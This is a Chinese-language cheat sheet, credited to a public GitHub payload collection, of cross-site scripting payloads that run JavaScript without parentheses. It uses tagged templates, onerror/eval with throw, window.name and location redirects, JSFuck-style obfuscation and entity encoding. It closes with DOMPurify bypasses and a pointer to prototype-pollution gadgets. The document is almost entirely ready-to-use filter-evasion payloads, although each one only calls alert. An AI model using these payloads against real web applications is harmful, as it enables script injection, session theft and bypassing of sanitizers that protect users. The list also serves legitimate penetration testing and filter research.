# 不带括号的XSS


### 来源[RenwaX23](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)

---
    alert`23`
---
    window.name="javascript:alert(23)";
    location="xss.html";
xss.html

    location=name

---



    eval.call`${'alert\x2823\x29'}`


---


    eval.apply`${[`alert\x2823\x29`]}`

---


    setTimeout`alert\x2823\x29`
    setInterval`alert\x2823\x29`

---

    onerror=alert;throw 23;

---

    window.name='javascript:alert\x2823\x29';
    Reflect.set.call`${location}${'href'}${name}`

---

    Reflect.apply.call`${alert}${undefined}${[23]}`

---

    navigation.navigate`javascript:alert\x2823\x29`

---

    var{haha:onerror=alert}=0;throw 1
    var{a:onerror}={a:alert};throw 1

---

    'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}

---
仅 Chrome

    onerror=eval;throw'=alert\x2823\x29';

---

    {onerror=alert}throw 23

----

    throw{},onerror??=alert,"XSS"??123

----

    http://example.com/?%0aalert(23)
    location.protocol='javascript:'

----

    [].sort.call`${alert}23`

----

    [].map.call`${eval}\\u{61}lert\x2823\x29`

----

    window.name='javascript:alert(23)';
    Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`;

----

仅 Firefox

    throw onerror=eval,SyntaxError`alert\x2823\x29`

----

仅 Firefox

    throw onerror=eval,Error`alert\x2823\x29`

----

    throw Uncaught=onerror=eval,e=Error`*/;alert\x2823\x29`,e.name='/*',e

----

    [][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]`$${[!{}+[]][+[]][+!+[]]+[!{}+[]][+[]][+!+[]+!+[]]+[!{}+[]][+[]][+!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]}$```//Function(alert(1))

----

xss_redir.html
```
window.name='1;var Uncaught=1;alert(23)';
location='xss_short.html';
```
xss_short.html
```
{onerror=eval}throw/0/+name
```

---

    example.com/#1/-alert(23)/
```    
onhashchange=setTimeout;
Object.prototype.toString=RegExp.prototype.toString;
Object.prototype.source=location.hash;
location.hash=null;
```

---

    throw/a/,Uncaught=1,g=alert,a=g+0,onerror=eval,/1/g+a[14]+[23,331,337]+a[15]

---

    window.name="alert(23)";
    location="xss.html";
xss.html

    Function`a${name}```

---

    `%0aalert(/23/)//`

    location='javascript:'+location
    location=/javascript:/.source+location
    location=`javascript:`+location

---

```
x={...eval+0,toString:Array.prototype.shift,length:15},
x+x+x+x+x+x+x+x+x+x+x+x+x,
location = /javascript:/.source + alert.name+x+23+x
```

---

    example.com/xss?%0aalert(/23/)//

    Function`a${unescape. call`${location}`}```

---

    c=document,h=c.head,x=h.part,p=g=h.id,h.valueOf=p.sub,x.valueOf=p.at,o=g++,l=g++,z=g++,e=g++,a=g++,s=g++,d=g++,j=g++,b=g++,h.part=h+p,y=h.innerHTML=x+p,h.part=h.innerHTML,p+=x,h.part=c.nodeName,p+=x,k=o+p,u=l+p,w=p+l,t=w+l,f=w+o+b+w,h.innerHTML=t+s+t+d+w+z+l+f+o+u+a+j+t+l+t+o+f+l+u+g+j+w+o+k+d+l,h.innerHTML=y+h.innerHTML+p+g+j+f+o+l+t+a+w+l+d+p+a+k+s+k+s+u+a+u+a+j+p+a+j+h

---

    onhashchange=setTimeout;
    HashChangeEvent.prototype.toString=
    RegExp.prototype.toString;
    location.hash=
    HashChangeEvent.prototype.source=
    '1/-alert\5023\51/';

---

    onload=setTimeout
    Event.prototype.toString=
    _=>"alert\5023\51"

---

    throw/**/Uncaught=window.onerror=eval,&quot;;alert\5023\51&quot;

---

```
x=new DOMMatrix;
matrix=alert;
x.a=23;
location='javascript'+':'+x
```

---

    Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}23${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```

---

    range = document.createRange``;
    range.createContextualFragment`<img src=x onerror=alert\x2823\x29>'`;

---

    Function`a${`${Function`a${`return from`}{from}``${Array}``96${Function`a${`return fromCharCode`}{fromCharCode}``${String}`}`}${Function`a${`return fromCharCode`}{fromCharCode}``${String}``${96}${10}${97}${108}${101}${114}${116}${40}${50}${51}${41}`}`}```


---

    window.name="alert(23)"
    location="xss.html"

xss.html

    eval.constructor`eval\x28name\x29```

---

    window.name="alert(23)"
    location="xss.html"

xss.html

    [].every.call`eval\x28name\x29${eval}`

---

    []["filter"]["constructor"]`alert\x2823\x29```

---

    Array.prototype[Symbol.hasInstance]=eval;
    "alert\x2823\x29" instanceof [];

---

    x='javascript:alert\x2823\x29';x={x:location}=this

---

    window.name="alert(23)"
    location="xss.html"

xss.html

    eval.call`${top.name}`

---

    window.name="<img src=x onerror=alert(23)>"
    location="xss.html"

xss.html

    document.write`${top.name}`

---

    <JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>

---

    location="https://example.com/xss.html/.source;alert(23)?xss="

example.com

    eval.call`${location.pathname}`

---

仅 Firefox

    {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}

---

```
example.com/xss#*/;alert(23);
```
```
throw/**/onerror=Uncaught=eval,e={lineNumber:1,columnNumber:1,fileName:'',message:'/*'+location.hash},typeof/**/InstallTrigger!='undefined'?e:e.message
```
---

```
<script/id=Uncaught>

// Chrome + Firefox

throw[onerror=eval][e=[x='+alert\x2823\x29']]=0[e.lineNumber=e.columnNumber=e.fileName=e.message=x]=e

</script>

<script>

// Firefox

onhashchange=setTimeout,HashChangeEvent.prototype[Symbol.toStringTag]='+alert\x2823\x29',location.hash=1

</script>

<script>

// Chrome + Firefox

Array.prototype[Symbol.hasInstance]=eval,'alert\x2823\x29'instanceof[]

</script>

<script>

// Chrome

[onerror=eval][TypeError.prototype.name='=/']['/-alert\x2823\x29//']

</script>


<script>

// Chrome

onerror=eval,ReferenceError.prototype.name='=alert\x2823\x29//',lol

</script>
```

---

```
elem=new Option
elem.classList.valueOf=String.prototype.charAt

elem.innerText=elem.outerHTML
elem.className=elem.innerHTML
amp=Object.__proto__.name+elem.classList

htag=new Text
elem.className=htag.nodeName
htag=Object.__proto__.name+elem.classList

elem.innerHTML=amp+htag+97
a=elem.innerText
elem.innerHTML=amp+htag+99
c=elem.innerText
elem.innerHTML=amp+htag+105
i=elem.innerText
elem.innerHTML=amp+htag+106
j=elem.innerText
elem.innerHTML=amp+htag+112
p=elem.innerText
elem.innerHTML=amp+htag+114
r=elem.innerText
elem.innerHTML=amp+htag+115
s=elem.innerText
elem.innerHTML=amp+htag+116
t=elem.innerText
elem.innerHTML=amp+htag+118
v=elem.innerText

elem.innerHTML=amp+htag+58
colon=elem.innerText

elem.innerHTML=amp+htag+40
lpar=elem.innerText
elem.innerHTML=amp+htag+41
rpar=elem.innerText

location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+1+rpar
```
---

```
document.body.innerHTML="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
```

---

```
document.body.innerHTML="&ltimg src=x onerror=alert&lpar;23&rpar;&gt"
document.body.innerHTML=document.body.innerText
```
---

```
data:text/html,<iframe name="<svg/onload=alert(23)>" src="http://example.com/xss?document.body.innerHTML=name">
```
---

    document.location='javascript:alert%2823%29'

---
仅 IE

    example.com/xss#<img src=x onerror=alert(23)>

    document.body.innerHTML=location.hash;
---

    <svg/onload='alert&#40 23 &#41'>

---

    location=/javascript:alert%2823%29/.source;

---

    http://example.com/?test=&lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;

    document.body.innerHTML=location.search;
    document.body.innerHTML=document.body.innerText;

---

# 使用脚本小工具

使用 Prorotype Pollution [PP Gadgets Repo](https://github.com/BlackFan/client-side-prototype-pollution#script-gadgets)

---

DOMPurify 绕过

    delete DOMPurify.isSupported

---

DOMPurify 绕过

    delete document.implementation.__proto__.createHTMLDocument

---
